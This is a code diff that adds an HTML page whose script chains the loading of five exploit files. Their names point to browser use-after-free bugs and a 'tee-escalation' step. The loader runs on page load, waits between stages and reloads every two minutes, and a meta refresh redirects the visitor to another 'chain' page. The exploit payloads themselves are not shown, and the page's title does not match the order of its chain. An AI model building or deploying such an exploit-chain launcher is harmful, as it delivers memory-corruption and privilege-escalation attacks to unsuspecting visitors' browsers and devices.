@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>V514→V516</title>
+<meta http-equiv="refresh" content="0;url=fa-v516-chain.html">
+</head>
+<body>
+<div id="status">Loading V514...</div>
+<script>
+// Chain: V515 first (needs user tap), then V511 → V512 → V513 → V514
+var probes = [
+  {name: 'V515', src: 'p515-clipboard-uaf.js', wait: 8000},
+  {name: 'V511', src: 'p511-postmessage-oom-uaf.js', wait: 15000},
+  {name: 'V512', src: 'p512-validation-bubble-uaf.js', wait: 15000},
+  {name: 'V513', src: 'p513-tee-escalation.js', wait: 10000},
+  {name: 'V514', src: 'p514-ce-reentry-uaf.js', wait: 8000}
+];
+var idx = 0;
+function runNext() {
+  if (idx >= probes.length) {
+    document.getElementById('status').textContent = 'All probes complete. Reloading in 120s...';
+    setTimeout(function() { location.reload(); }, 120000);
+    return;
+  }
+  var p = probes[idx++];
+  document.getElementById('status').textContent = 'Running ' + p.name + '...';
+  var s = document.createElement('script');
+  s.src = p.src;
+  s.onload = function() { setTimeout(runNext, p.wait); };
+  s.onerror = function() { setTimeout(runNext, 1000); };
+  document.body.appendChild(s);
+}
+runNext();
+</script>
+</body>
+</html>
